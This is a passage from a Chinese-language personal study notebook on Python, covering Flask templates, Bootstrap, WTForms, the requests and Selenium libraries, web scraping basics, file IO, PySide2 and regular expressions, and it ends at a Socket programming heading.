<tr><td>jimg</td><td><code>&lt;img src=&quot;{{ url_for('static', filename='A') }}&quot; alt=&quot;B&quot;&gt;</code></td></tr>
<tr><td>jhref</td><td>a href with url_for embed</td></tr>
</tbody></table>
</div>
<h4 id="demo-2"><a class="header" href="#demo-2">Demo</a></h4>
<p>默认情况下，flask在程序文件夹的templates子文件夹寻找模板。比如，文件的组织是这样的，模板写在index.html和base.html中。</p>
<pre><code>├── main.py
├── static
└── templates
    ├── base.html
    └── index.html
</code></pre>
<p>main.py：用render_template函数渲染模板。</p>
<pre><code class="language-python">from flask import Flask,render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template(&quot;index.html&quot;)

app.run(debug=True)
</code></pre>
<h4 id="过滤器"><a class="header" href="#过滤器">过滤器</a></h4>
<p>过滤器就是一个简单的对变量进行修改。使用：<code>{{ name|filter}}</code>。</p>
<h3 id="网页设计-bootstrap"><a class="header" href="#网页设计-bootstrap">网页设计 Bootstrap</a></h3>
<p>这是一个Twitter开发的前端框架，有了它可以方便的做出漂亮的网页。有两个神仙网站可以帮你：
<a href="https://www.runoob.com/try/bootstrap/layoutit/#">菜鸟工具，可视化制作页面</a>和<a href="https://how2j.cn/k/boostrap/boostrap-button/477.html#nowhere">组件一览</a>。这样就可以很好的利用bootstrap帮你设计好的组件样式了。当然你如果不满意的话还可以自己再加工。大部分的使用方法就是在class属性中添加上对应的类。
以及一个很好的代码生成插件<a href="https://marketplace.visualstudio.com/items?itemName=Crozzo.the-powerful-bootstrap">The Powerful Bootstrap</a></p>
<p>安装：<code>pip install flask-bootstrap</code>。</p>
<h4 id="demo-3"><a class="header" href="#demo-3">Demo</a></h4>
<p>main.py</p>
<pre><code class="language-python">from flask import Flask,render_template
from flask_bootstrap import Bootstrap

app = Flask(__name__)
Bootstrap(app)

@app.route('/')
def index():
    return render_template(&quot;index.html&quot;)

app.run(debug=True)
</code></pre>
<p>在模板中，添加一句<code>{% extends &quot;bootstrap/base.html&quot; %}</code>，然后就可以使用Bootstrap的base.html模板了，里面定义的块如下。但是最好不要直接重定义这些块，应该用<code>{{super()}}</code>函数向块中添加新内容。</p>
<div class="table-wrapper"><table><thead><tr><th>块</th><th>说明</th></tr></thead><tbody>
<tr><td>doc</td><td>整个HTML文档</td></tr>
<tr><td>html_sttribs</td><td>html标签的属性</td></tr>
<tr><td>html</td><td>html标签的内容</td></tr>
<tr><td>head</td><td>head标签的内容</td></tr>
<tr><td>title</td><td>title标签的内容</td></tr>
<tr><td>metas</td><td></td></tr>
<tr><td>styles</td><td></td></tr>
<tr><td>body_attribs</td><td>body标签的属性</td></tr>
<tr><td>body</td><td>body标签的内容</td></tr>
<tr><td>navbar</td><td>用户定义的导航条</td></tr>
<tr><td>content</td><td>用户定义的页面内容</td></tr>
<tr><td>scripts</td><td>文档底部的javascript</td></tr>
</tbody></table>
</div>
<h3 id="flask中的静态文件"><a class="header" href="#flask中的静态文件">flask中的静态文件</a></h3>
<p>动态的 web 应用也需要静态文件，一般是 CSS 和 JavaScript 文件、图片文件。只要在你的包或模块旁边创建一个名为 <code>static</code> 的文件夹就行了。 静态文件位于应用的 <code>/static</code> 中。可以参考上面的文件夹结构。</p>
<p>使用特定的 <code>'static'</code> 端点就可以生成相应的 URL</p>
<pre><code class="language-python">url_for('static', filename='style.css')
#这个静态文件在文件系统中的位置应该是“static/style.css”。
</code></pre>
<p>除此以外，<a href="https://dormousehole.readthedocs.io/en/latest/api.html#flask.url_for">url_for</a>还能为视图函数生成地址。详细的API参考点击链接：</p>
<pre><code>url_for('index')
</code></pre>
<h3 id="flask中的时间"><a class="header" href="#flask中的时间">flask中的时间</a></h3>
<p>安装：<code>pip install flask-moment</code></p>
<h3 id="表单star"><a class="header" href="#表单star">表单:star:</a></h3>
<p>上面讲的知识足够建造一个优秀的静态网站了。但是要做到能和用户进行数据交互，还需要表单和数据库。（当然你可以通过HTTP方法底层直接通信，但是那个太麻烦了）</p>
<p><code>pip install flask-wtf</code>：<a href="http://www.pythondoc.com/flask-wtf/">flask-WTF</a>是一个优秀的处理Web表单的辅助工具。</p>
<center>WTForms支持的HTML标准字段，字段构造函数</center>
<div class="table-wrapper"><table><thead><tr><th>字段类型</th><th>说 明</th></tr></thead><tbody>
<tr><td>StringField</td><td>文本字段</td></tr>
<tr><td>TextAreaField</td><td>多行文本字段</td></tr>
<tr><td>PasswordField</td><td>密码文本字段</td></tr>
<tr><td>HiddenField</td><td>隐藏文本字段</td></tr>
<tr><td>DateField</td><td>文本字段，值为 datetime.date 格式</td></tr>
<tr><td>DateTimeField</td><td>文本字段，值为 datetime.datetime 格式</td></tr>
<tr><td>IntegerField</td><td>文本字段，值为整数</td></tr>
<tr><td>DecimalField</td><td>文本字段，值为 decimal.Decimal</td></tr>
<tr><td>FloatField</td><td>文本字段，值为浮点数</td></tr>
<tr><td>BooleanField</td><td>复选框，值为 True 和 False</td></tr>
<tr><td>RadioField</td><td>一组单选框</td></tr>
<tr><td>SelectField</td><td>下拉列表</td></tr>
<tr><td>SelectMultipleField</td><td>下拉列表，可选择多个值</td></tr>
<tr><td>FileField</td><td>文件上传字段</td></tr>
<tr><td>SubmitField</td><td>表单提交按钮</td></tr>
<tr><td>FormField</td><td>把表单作为字段嵌入另一个表单</td></tr>
<tr><td>FieldList</td><td>一组指定类型的字段</td></tr>
</tbody></table>
</div><center>WTForms内置的验证类型，验证函数</center>
<div class="table-wrapper"><table><thead><tr><th>验证函数</th><th>说明</th></tr></thead><tbody>
<tr><td>Integer</td><td>int</td></tr>
<tr><td>SmallInteger</td><td>int</td></tr>
<tr><td>BigInteger</td><td>int</td></tr>
<tr><td>Float</td><td>float</td></tr>
<tr><td>Numeric</td><td>decimal.Decimal</td></tr>
<tr><td>String</td><td>str</td></tr>
<tr><td>Text</td><td>str</td></tr>
<tr><td>Unicode</td><td>unicode</td></tr>
<tr><td>UnicodeText</td><td>unicode</td></tr>
<tr><td>Boolean</td><td>bool</td></tr>
<tr><td>Date</td><td>datetime.date</td></tr>
<tr><td>Time</td><td>datetime.time</td></tr>
<tr><td>DateTime</td><td>datetime.datetime</td></tr>
<tr><td>Interval</td><td>datetime.timedelta</td></tr>
<tr><td>Enum</td><td>str</td></tr>
<tr><td>PickleType</td><td>任何 Python 对象</td></tr>
<tr><td>LargeBinary</td><td>str</td></tr>
</tbody></table>
</div>
<p>至此，基础知识就全部具备了。不过在具体开发的过程中，需要注意的还有工程的管理。</p>
<p>做了一个初级的Demo，非常的垃圾。不过还是学到了一些东西。主要是对Web的工作有了更深一点的认识。</p>
<ol>
<li>在底层看，无非是Socket的通信罢了。</li>
<li>在应用层看，是Request和Response的交互。对用户的每一个Request，我都要给出对应的Response。</li>
<li>在开发的过程中看，分为前端和后端
<ol>
<li>前端，要做好页面设计，给用户一个良好的感官体验。</li>
<li>前端，要向后端发送表单。要设计好让用户填写的表单，通过POST请求发送到后端。</li>
<li>后端，要对用户的请求做出相应的响应。在请求中最主要的是关注URL，如果是POST请求的话还有Request Body。如果是登录的话可能还有Cookie。所以我们要根据这些参数构造不同的<strong>视图函数</strong>，做出对应的回复。</li>
<li>后端，要操纵数据库，从数据库中获取相应的信息返回给用户。</li>
</ol>
</li>
</ol>
<p><img src="Language/Python/4%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BA%93/../images/1612364224589.svg" alt="" />
<img src="Language/Python/4%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BA%93/../images/1612362458162.jpg" alt="" />
<img src="Language/Python/4%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BA%93/../images/1612362540277.jpg" alt="" />
<img src="Language/Python/4%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BA%93/../images/1612365246625.jpg" alt="" />
以后如果有机会的话，再继续深入研究吧。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="internet-1"><a class="header" href="#internet-1">Internet</a></h1>
<h2 id="requests"><a class="header" href="#requests">Requests</a></h2>
<p>https://requests.readthedocs.io/zh_CN/latest/</p>
<pre><code class="language-sh">pip3 install requests
</code></pre>
<p>我觉得这个库的源代码很值得学习。这可以称得上是<strong>最好的HTTP库</strong>了，结构很清楚。</p>
<pre><code class="language-python">#import requests
#发送HTTP请求，比如GET和POST
requests.request(method, url, **kwargs)		#这是七个HTTP Request方法的由来，其中常用的参数见下
requests.get(url,params,**kwarg)	#data就是附在url后面的参数，kwarg就是HTTP请求头中间的那些参数
requests.post(url, data=None, json=None, **kwargs)	#post
</code></pre>
<p>request的附带参数（**kwargs）：</p>
<ul>
<li><strong>params</strong> -- (optional) Dictionary or bytes to be sent in the query string for the <a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Request"><code>Request</code></a>。<strong>和URL放在一起的参数。</strong></li>
<li><strong>data</strong> -- (optional) Dictionary or list of tuples <code>[(key, value)]</code> (will be form-encoded), bytes, or file-like object to send in the body of the <a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Request"><code>Request</code></a>。<strong>请求体。可以理解为POST方法中的数据，放在请求头后面的数据，</strong></li>
<li><strong>json</strong> -- (optional) json data to send in the body of the <a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Request"><code>Request</code></a>。<strong>也是请求体，但是被打包成json。</strong></li>
<li><strong>headers</strong> -- (optional) Dictionary of HTTP Headers to send with the <a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Request"><code>Request</code></a>。<strong>对请求头的修改。</strong></li>
<li><strong>cookies</strong> -- (optional) Dict or CookieJar object to send with the <a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Request"><code>Request</code></a>.</li>
<li><strong>files</strong> -- (optional) Dictionary of <code>'name': file-like-objects</code> (or <code>{'name': file-tuple}</code>) for multipart encoding upload. <code>file-tuple</code> can be a 2-tuple <code>('filename', fileobj)</code>, 3-tuple <code>('filename', fileobj, 'content_type')</code> or a 4-tuple <code>('filename', fileobj, 'content_type', custom_headers)</code>, where <code>'content-type'</code> is a string defining the content type of the given file and <code>custom_headers</code> a dict-like object containing additional headers to add for the file。<strong>请求体，传文件</strong></li>
<li><strong>auth</strong> -- (optional) Auth tuple to enable Basic/Digest/Custom HTTP Auth。这个验证方式好像已经基本不怎么用了。</li>
<li><strong>timeout</strong> (<em>float</em> <em>or</em> <em>tuple</em>) -- (optional) How many seconds to wait for the server to send data before giving up, as a float, or a <a href="https://requests.readthedocs.io/zh_CN/latest/user/advanced.html#timeouts">(connect timeout, read timeout)</a> tuple. </li>
<li><strong>allow_redirects</strong> (<em>bool</em>) -- (optional) Boolean. Enable/disable GET/OPTIONS/POST/PUT/PATCH/DELETE/HEAD redirection. Defaults to <code>True</code>.</li>
<li><strong>proxies</strong> -- (optional) Dictionary mapping protocol to the URL of the proxy.</li>
<li><strong>verify</strong> -- (optional) Either a boolean, in which case it controls whether we verify the server's TLS certificate, or a string, in which case it must be a path to a CA bundle to use. Defaults to <code>True</code>.</li>
<li><strong>stream</strong> -- (optional) if <code>False</code>, the response content will be immediately downloaded.</li>
<li><strong>cert</strong> -- (optional) if String, path to ssl client cert file (.pem). If Tuple, ('cert', 'key') pair.</li>
</ul>
<p>下面我们来看response中Request为我们解析出来的信息。</p>
<pre><code class="language-python">import requests
res = requests.get(url,headers=headers)		#这些请求都会返回一个Response对象
res.text	#解码之后的response的Entity Body部分
res.encoding	#修改解码方法，一般情况下requests库会帮你推断
res.content		#response的Entity Body部分，二进制格式	
res.json	#response的Entity Body部分，request自带的json解码器会帮你解码json
res.status_code		#response的状态码
res.headers		#response的首部行
res.cookies		#response的cookie.的返回对象为 RequestsCookieJar，它的行为和字典类似，但接口更为完整
res.history		#默认情况下requests会自动帮你完成重定向，Response.history 是一个 Response 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。
</code></pre>
<p><a href="https://requests.readthedocs.io/zh_CN/latest/user/quickstart.html#id11">错误与异常</a></p>
<ul>
<li>遇到网络问题（如：DNS 查询失败、拒绝连接等）时，Requests 会抛出一个 <code>ConnectionError</code> 异常。</li>
<li>如果 HTTP 请求返回了不成功的状态码， <code>Response.raise_for_status()</code> 会抛出一个 <code>HTTPError</code> 异常。</li>
<li>若请求超时，则抛出一个 <code>Timeout</code> 异常。</li>
<li>若请求超过了设定的最大重定向次数，则会抛出一个 <code>TooManyRedirects</code> 异常。</li>
<li>所有Requests显式抛出的异常都继承自 <code>requests.exceptions.RequestException</code> 。</li>
</ul>
<h2 id="selenium"><a class="header" href="#selenium">Selenium</a></h2>
<p>https://www.selenium.dev/documentation/en/, http://www.testclass.net/selenium_python</p>
<p>可以认为是一个<strong>自动化控制浏览器</strong>的一个优秀的库。需要准备环境，包括python, selenium, <strong>webdriver</strong>.</p>
<p>框架底层使用JavaScript模拟真实用户对浏览器进行操作。测试脚本执行时，浏览器自动按照脚本代码做出点击，输入，打开，验证等操作，就像真实用户所做的一样，从终端用户的角度测试应用程序。</p>
<ul>
<li>
<p>准备工作</p>
<pre><code class="language-python">from selenium import webdriver
driver = webdriver.Chrome(chrome_options=options)	#打开webdriver
</code></pre>
</li>
<li>
<p>元素定位</p>
<pre><code class="language-python">#一共有8种方法，顾名思义。最后两种办法最普适也最复杂。
find_element_by_id()	
find_element_by_name()	
find_element_by_class_name()
find_element_by_tag_name()
find_element_by_link_text()
find_element_by_partial_link_text()
find_element_by_xpath()	#xpath不太熟，但是可以在chrome中直接复制。
find_element_by_css_selector()
#把element改成elements，可以获得符合条件的一组元素	
</code></pre>
</li>
<li>
<p>窗口大小控制</p>
<pre><code class="language-python">driver.set_window_size(480, 800)	#设置窗口大小
driver.maximize_window()
</code></pre>
</li>
<li>
<p>特殊动作</p>
<pre><code class="language-python">driver.back()		#后退
driver.forward()	#前进
driver.refresh() 	#刷新当前页面
</code></pre>
</li>
<li>
<p><strong>常用动作</strong></p>
<pre><code class="language-python">#基本操作
input = d.find_element_by_xpath(r'//*[@id=&quot;kw&quot;]')
input.send_keys(value)	#输入文本，基本键盘操作
input.clear()		#清除文本
input.click()		#单击，基本鼠标操作
#鼠标事件
from selenium.webdriver.common.action_chains import ActionChains
ActionChains(driver).move_to_element(above).perform()	# 对定位到的元素执行鼠标悬停操作
context_click()		#右击
double_click()		#双击
drag_and_drop()		#拖动
move_to_element()	#鼠标悬停
#键盘事件
from selenium.webdriver.common.keys import Keys
send_keys(Keys.BACK_SPACE) 	#删除键（BackSpace）
send_keys(Keys.CONTROL,'a') #全选（Ctrl+A）
send_keys(Keys.CONTROL,'c') #复制（Ctrl+C）
#截图，用绝对路径
driver.get_screenshot_as_file(&quot;/home/reticence/baidu.png&quot;)
</code></pre>
</li>
<li>
<p>获取信息</p>
<pre><code class="language-Python">#获取元素属性
input.get_attribute(name)	#获得某属性
input.text		#获取元素文本
#获取页面信息
driver.title	#标题
driver.current_url	#URL
</code></pre>
</li>
<li>
<p>设置等待时间</p>
<p><code>driver.implicitly_wait(10)</code></p>
</li>
<li>
<p>切换frame</p>
<p>WebDriver只能在一个页面上对元素识别与定位，对于frame/iframe表单内嵌页面上的元素无法直接定位。</p>
<pre><code class="language-python">#先通过xpth定位到iframe
xf = driver.find_element_by_xpath('//*[@id=&quot;x-URS-iframe&quot;]')
#再将定位对象传给switch_to.frame()方法
driver.switch_to.frame(xf)
driver.switch_to.parent_frame()		#上级表单，表单可能嵌套
driver.switch_to.default_content()	#回到最外层，即页面
</code></pre>
</li>
<li>
<p>切换window</p>
<pre><code class="language-python">handle = driver.window_handles[1]		#获得当前所有打开窗口的句柄
driver.switch_to.window(handle)		#切换窗口
</code></pre>
<p><code>driver.switch_to_alert().accept()</code>：切换到alert/prompt/confirm，接受</p>
</li>
<li>
<p>下拉框选择</p>
<pre><code class="language-python">from selenium.webdriver.support.select import Select
sel=browser.find_element_by_xpath(&quot;/html/body/div[1]/div[1]/div/section/div[4]/ul/li[23]/div/div/select[1]&quot;)	#定位select元素
Select(sel).select_by_visible_text('浙江省')	#通过选项的文本选择
Select(s).select_by_index(5)	#从0开始计数
Select(s).select_by_value('2')	
</code></pre>
</li>
<li>
<p>Cookie</p>
<pre><code class="language-python">driver.get_cookies()	#获得cookie
driver.add_cookie(cookie_dict) #添加cookie。“cookie_dict”指字典对象，必须有name 和value 值。
</code></pre>
</li>
<li>
<p>拉动滚动条
没有直接拉动滚动条的办法。通过执行js代码实现。</p>
<pre><code class="language-python">js=&quot;window.scrollTo(100,450);&quot;
driver.execute_script(js)
</code></pre>
</li>
<li>
<p>跑路
<code>driver.close()</code>关闭单个窗口；<code>driver.quit()</code>关闭所有窗口</p>
</li>
</ul>
<h2 id="appium"><a class="header" href="#appium">appium</a></h2>
<p>http://www.testclass.net/appium/about_appium</p>
<pre><code class="language-sh">pip install Appium-Python-Client
</code></pre>
<ol>
<li>appium是开源的移动端自动化测试框架；</li>
<li>appium可以测试原生的、混合的、以及移动端的web项目；</li>
<li>appium可以测试ios，android应用（当然了，还有firefox os）；</li>
<li>appium是跨平台的，可以用在osx，windows以及linux桌面系统上；</li>
</ol>
<h2 id="关于爬虫"><a class="header" href="#关于爬虫">关于爬虫</a></h2>
<p>说了半天，还是没有讲到爬虫怎么写。事实上，学爬虫是我学Python最开始的原因，虽然之后变成了写各种小脚本。言归正传，简单的说爬虫就是自动化抓取网页信息的工具，一般用python来写，因为方便。</p>
<p>爬虫的基本流程，包括发送请求和接受数据-解析数据-清洗数据-保存数据。</p>
<ol>
<li>发送请求。有内置的urllib库，我没有用过。反正<strong>request</strong>库很好用。</li>
<li>解析数据。我们接受到的数据可能是json/html文本/二进制数据等等。json在python里有内置的库解析，二进制数据也没啥好解析的，该是啥是啥。html的解析可以用<strong>beautifulsoup(第三方)</strong>,<strong>lxml（标准库）</strong>，当然还有万能的正则表达式<strong>re</strong>.</li>
<li>清洗数据。</li>
<li>保存数据。简单的可以直接用<strong>file</strong>。当然也有保存到表格（<strong>csv</strong>）。高端的正式的就是保存到数据库了。</li>
</ol>
<p>难点在哪呢？</p>
<ol>
<li>发送请求可能是会被反爬手段拒绝的。所以我们可能要修改请求头，cookie，代理等。批量爬取意味着批量发送请求，你还要合理的构造请求。如果为了高效的话可能还要多线程。</li>
<li>解析数据本来就挺难的。你要观察数据特点。</li>
<li>得到的数据可能是乱七八糟的，要用各种方法清洗数据。</li>
</ol>
<p>所以，这玩意儿我现在还是不太会。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="file-io"><a class="header" href="#file-io">File IO</a></h1>
<p>在Linux中，一切皆文件。我们用操作文件的方式处理所有的东西。所以我觉得我有必要把python学习的重点，放在文件的处理上。一个是文件的读，写，查的基本操作。或者说是Create, Open, Append, Read, Write的基本操作。然后文件也分为ascii文件，binary文件。读入他们之后，具体怎么操作，就依靠string&amp;bytes了。</p>
<p>https://docs.python.org/zh-cn/3/library/io.html</p>
<h2 id="io"><a class="header" href="#io">IO</a></h2>
<blockquote>
<p>The <a href="https://docs.python.org/3/library/io.html?highlight=%E6%96%87%E4%BB%B6#module-io"><code>io</code></a> module provides Python’s main facilities for dealing with various types of I/O. There are three main types of I/O: <em>text I/O</em>, <em>binary I/O</em> and <em>raw I/O</em>. These are generic categories, and various backing stores can be used for each of them. A concrete object belonging to any of these categories is called a <a href="https://docs.python.org/3/glossary.html#term-file-object">file object</a>. Other common terms are <em>stream</em> and <em>file-like object</em>.</p>
<p>Independent of its category, each concrete stream object will also have various capabilities: it can be read-only, write-only, or read-write. It can also allow arbitrary random access (seeking forwards or backwards to any location), or only sequential access (for example in the case of a socket or pipe).	</p>
</blockquote>
<h2 id="open-1"><a class="header" href="#open-1">Open</a></h2>
<p>Opens the file and returns a corresponding file object.</p>
<pre><code class="language-python">&lt;file&gt; = open(&lt;path&gt;, mode='r', encoding=None, newline=None)
</code></pre>
<ul>
<li><code>'encoding=None'</code> means that the default encoding is used, which is platform dependent. Best practice is to use <code>'encoding=&quot;utf-8&quot;'</code> whenever possible.</li>
<li><code>'newline=None'</code> means all different end of line combinations are converted to '\n' on read, while on write all '\n' characters are converted to system's default line separator.</li>
<li><code>'newline=&quot;&quot;'</code> means no conversions take place, but input is still broken into chunks by readline() and readlines() on every '\n', '\r' and '\r\n'.</li>
</ul>
<h3 id="modes"><a class="header" href="#modes">Modes</a></h3>
<ul>
<li><code>'r'</code> - Read (default).</li>
<li><code>'w'</code> - Write (truncate).</li>
<li><code>'x'</code> - Write or fail if the file already exists.</li>
<li><code>'a'</code> - Append.</li>
<li><code>'w+'</code> - Read and write (truncate).</li>
<li><code>'r+'</code> - Read and write from the start.</li>
<li><code>'a+'</code> - Read and write from the end.</li>
<li><code>'t'</code> - Text mode (default).</li>
<li><code>'b'</code> - Binary mode (<code>'br'</code>, <code>'bw'</code>, <code>'bx'</code>, …).</li>
</ul>
<h3 id="exceptions"><a class="header" href="#exceptions">Exceptions</a></h3>
<ul>
<li><code>'FileNotFoundError'</code> can be raised when reading with <code>'r'</code> or <code>'r+'</code>.</li>
<li><code>'FileExistsError'</code> can be raised when writing with <code>'x'</code>.</li>
<li><code>'IsADirectoryError'</code> and <code>'PermissionError'</code> can be raised by any.</li>
<li><code>'OSError'</code> is the parent class of all listed exceptions.</li>
</ul>
<h2 id="close"><a class="header" href="#close">Close</a></h2>
<p><code>f.close()</code>，我们一般把他放在finally语句中保证被执行。</p>
<p>像下面这种方式，我们就不需要显式的关闭文件，是被推荐的写法。</p>
<pre><code class="language-python">with open(&quot;test.txt&quot;, encoding = 'utf-8') as f:
   # perform file operations
</code></pre>
<h2 id="readwrite"><a class="header" href="#readwrite">Read&amp;Write</a></h2>
<p>Seek的三个常量：os.SEEK_SET,SEEK_END,SEEK_CUR</p>
<pre><code class="language-python">&lt;file&gt;.seek(0)                      # Moves to the start of the file.
&lt;file&gt;.seek(offset)                 # Moves 'offset' chars/bytes from the start.
&lt;file&gt;.seek(0, 2)                   # Moves to the end of the file.

&lt;bin_file&gt;.seek(±offset, &lt;anchor&gt;)  # Anchor: 0 start, 1 current position, 2 end.
&lt;str/bytes&gt; = &lt;file&gt;.read(size=-1)  # Reads 'size' chars/bytes or until EOF.
&lt;str/bytes&gt; = &lt;file&gt;.readline()     # Returns a line or empty string/bytes on EOF.
&lt;list&gt;      = &lt;file&gt;.readlines()    # Returns a list of remaining lines.
&lt;str/bytes&gt; = next(&lt;file&gt;)          # Returns a line using buffer. Do not mix.

&lt;file&gt;.write(&lt;str/bytes&gt;)           # Writes a string or bytes object.
&lt;file&gt;.writelines(&lt;collection&gt;)     # Writes a coll. of strings or bytes objects.
&lt;file&gt;.flush()                      # Flushes write buffer. Runs every 4096/8192 B.
</code></pre>
<ul>
<li>Methods do not add or strip trailing newlines, even writelines().</li>
</ul>
<h3 id="read-text-from-file"><a class="header" href="#read-text-from-file">Read Text from File</a></h3>
<pre><code class="language-python">def read_file(filename):
    with open(filename, encoding='utf-8') as file:
        return file.readlines()
</code></pre>
<h3 id="write-text-to-file"><a class="header" href="#write-text-to-file">Write Text to File</a></h3>
<pre><code class="language-python">def write_to_file(filename, text):
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(text)
</code></pre>
<p>事实上，对于不同的stream类型我们有不同的IO方式，不过一般来说上面的就够用了。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pyside2"><a class="header" href="#pyside2">PySide2</a></h1>
<p>PySide2是对Qt5的Python绑定，是一个优秀的GUI框架。相比于PyQt5他的协议(LGPL)更宽松，不过两者非常相似。</p>
<h2 id="hello-world-2"><a class="header" href="#hello-world-2">Hello World</a></h2>
<p>需要python版本为3.5+，执行下面的命令即可安装PySide2和QT designer。</p>
<pre><code class="language-sh">pip3 install pyside2
sudo apt install qttools5-dev-tools
</code></pre>
<p>下面的代码可以构建一个空白的窗口，如果执行成功说明环境搭建没有问题。</p>
<pre><code class="language-python">#!/usr/bin/python3
import sys

from PySide2.QtCore import QLibraryInfo, qVersion
from PySide2.QtWidgets import QApplication, QWidget


class Window(QWidget):
    def __init__(self):
        super(Window, self).__init__()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = Window()
    window.setWindowTitle(&quot;hello world&quot;)
    window.show()
    sys.exit(app.exec_())
</code></pre>
<h2 id="hello-qt-designer"><a class="header" href="#hello-qt-designer">Hello Qt Designer</a></h2>
<p>Qt Designer让我们可以通过拖拽控件的方式绘制界面。保存为<code>.ui</code>文件之后可以通过下面的命令转换为<code>.py</code>文件使用。</p>
<pre><code class="language-sh">pyside2-uic xxx.ui &gt; xxx.py
</code></pre>
<p>但是光通过拖拽并不能绘制好的界面，要做到更好的布局。</p>
<h2 id="控件"><a class="header" href="#控件">控件</a></h2>
<p>对于简单的GUI编程来说，就是前端界面+事件绑定。如果事件处理能够做到做到不阻塞前端界面渲染就很好了。事件绑定就是把<strong>回调函数</strong>和某个动作（比如点击按钮，拖动）绑定在一起。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="regex"><a class="header" href="#regex">Regex</a></h1>
<h2 id="regular-expression"><a class="header" href="#regular-expression">Regular Expression</a></h2>
<p>怎么写正则表达式呢？这里不会介绍。不过有参考资料</p>
<ul>
<li><a href="https://www.jb51.net/shouce/jquery/regexp.html">速查表</a>，如果忘记了一些写法可以看这个，这个所有语言的正则表达式都是一样的。</li>
<li><a href="https://docs.python.org/3/library/re.html#flags">Python Regex Flag</a>，有时候需要一些特殊的控制，比如<code>re.DOTALL</code>让<code>.</code>可以匹配换行符。</li>
</ul>
<h2 id="pattern"><a class="header" href="#pattern">Pattern</a></h2>
<p>在需要用到正则表达式的地方，一般都可以直接传入字符串，或者是使用<code>re.compile()</code>预先编译好的<code>Pattern</code>类。如果说正则表达式会被反复使用的话，推荐预先编译。</p>
<pre><code class="language-python"># 匹配C语言中变量名等正则表达式，忽略了关键字
var = re.compile(r&quot;[a-zA-Z_][0-9a-zA-Z_]*&quot;)
# 下面两种写法是等价的
var.match(&quot;hello&quot;)
re.match(var, &quot;hello&quot;)
</code></pre>
<h2 id="operation"><a class="header" href="#operation">Operation</a></h2>
<p>可以对字符串进行查找、修改等操作。一般来说下面的四种查找方式就够用了</p>
<div class="table-wrapper"><table><thead><tr><th>方法</th><th>含义</th></tr></thead><tbody>
<tr><td><code>re.search</code></td><td>扫描整个字符串，找到第一个匹配的子串</td></tr>
<tr><td><code>re.match</code></td><td>从字符串的开头，找到一个匹配对子串</td></tr>
<tr><td><code>re.fullmatch</code></td><td>判断整个字符串是否匹配</td></tr>
<tr><td><code>re.finditer</code></td><td>扫描整个字符串，找到所有匹配的<strong>不相互重叠</strong>的子串的<strong>迭代器</strong>，延迟计算</td></tr>
</tbody></table>
</div>
<p>查找通过<code>Match</code>类返回查找结果。Match类其实非常简单，包含了匹配到的子串和位置信息。</p>
<pre><code class="language-python">&lt;str&gt;   = &lt;Match&gt;.group()             # Returns the whole match. Also group(0).
&lt;str&gt;   = &lt;Match&gt;.group(1)            # Returns part in the first bracket.
&lt;tuple&gt; = &lt;Match&gt;.groups()            # Returns all bracketed parts.
&lt;int&gt;   = &lt;Match&gt;.start()             # Returns start index of the match.
&lt;int&gt;   = &lt;Match&gt;.end()               # Returns exclusive end index of the match.
</code></pre>
<p>还有修改字符串的操作，有替换<code>re.sub</code>(substitute)和分割<code>re.split</code>两种。</p>
<pre><code class="language-python">import re
&lt;str&gt;   = re.sub(&lt;regex&gt;, repl, string, count=0)  # 返回将string中出现和regex匹配的换成repl的新字符串
&lt;list&gt;  = re.findall(&lt;regex&gt;, text)            # Returns all occurrences as strings.
&lt;list&gt;  = re.split(&lt;regex&gt;, text, maxsplit=0)  # Use brackets in regex to include the matches.
&lt;Match&gt; = re.search(&lt;regex&gt;, text)             # Searches for first occurrence of the pattern.
&lt;Match&gt; = re.match(&lt;regex&gt;, text)              # Searches only at the beginning of the text.
&lt;iter&gt;  = re.finditer(&lt;regex&gt;, text)           # Returns all occurrences as match objects.
</code></pre>
<h2 id="例子-1"><a class="header" href="#例子-1">例子</a></h2>
<p>正则表达式主要的功能可以分为两个,<strong>查找Search</strong>和<strong>匹配Match</strong>。</p>
<p>匹配方法:fullmatch(),match(),search</p>
<pre><code class="language-python">import re
text = &quot;&quot;&quot;&lt;p&gt;&lt;strong&gt;说明：&lt;/strong&gt; 如果需要匹配的字符是正则表达式中的特殊字符，那么可以使用\进行转义处理，例如想匹配小数点可以写成\.就可以了，因为直接写.会匹配任意字符；同理，想匹配圆括号必须写成\(和\)，否则圆括号被视为正则表达式中的分组。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;h3-python-&quot;&gt;&lt;a name=&quot;Python对正则表达式的支持&quot; class=&quot;reference-link&quot;&gt;&lt;/a&gt;&lt;span class=&quot;header-link octicon octicon-link&quot;&gt;&lt;/span&gt;Python对正则表达式的支持&lt;/h3&gt;&lt;p&gt;Python提供了re模块来支持正则表达式相关操作，下面是re模块中的核心函数。&lt;/p&gt;&quot;&quot;&quot;

reg = re.compile(&quot;&lt;p&gt;(.*)&lt;/p&gt;&quot;)
match = reg.findall(text)
for i in match:
    print(i)	#findall返回一个元素都是str的列表
</code></pre>
<p>修改数据，主要方法是sub(),split()</p>
<pre><code class="language-python">text = '''# 搜索引擎的使用
高级搜索 https://g.luciaz.me/advanced_search?hl=en&amp;fg=1
综合搜索 https://search.chongbuluo.com/'''

pattern = re.compile(&quot;(.*?) (https?://.*/?)&quot;)
t = pattern.sub(lambda m: &quot;[{}]({}){}&quot;.format(m.group(1),m.group(2),m.group(2)),text)
#pattern.sub()，第一个参数是修改方法，第二个参数是目标文本。
#注意这里的Match对象m，m.group(0)默认是整个，然后index才会根据（）依次向后
print(t)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="socket编程"><a class="header" href="#socket编程">Socket编程</a></h1>
